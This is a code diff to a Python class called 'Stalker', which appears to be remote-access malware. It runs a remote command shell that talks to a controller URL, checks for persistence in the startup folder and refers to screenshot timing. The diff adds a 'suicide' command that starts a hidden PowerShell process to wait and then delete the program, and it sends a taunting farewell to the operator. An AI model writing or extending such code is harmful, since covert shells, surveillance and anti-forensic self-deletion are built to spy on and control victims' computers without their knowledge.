@@ -57,6 +57,18 @@ class Stalker:
 
     def is_file_in_startup(self):
         return sys.argv[0].startswith(self.StartupFolder)
+
+
+    def suicide(self):
+        ps_command = f"""
+        Start-Sleep -Seconds {self.ShellDelay_sec + self.ScreenshotsDelay_sec + 15};
+        Remove-Item -Force '{self.ProgramName}'
+        """
+
+        subprocess.Popen(['powershell', '-Command', ps_command], creationflags=subprocess.CREATE_NO_WINDOW)
+
+        self.SendText("<shell>bye my friend :)", self.Shell_url)
+        self.running = False
     
 
     def Shell(self):
@@ -69,6 +81,8 @@ class Stalker:
                 if command == "quit":
                     self.running = False
                     self.SendText("<shell>bye my friend, hopefully i see u soon :)", self.Shell_url)
+                elif command.startswith("suicide"):
+                    self.suicide()
                 elif command.startswith("<shell>"):
                     pass
                 elif command.startswith("cd"):
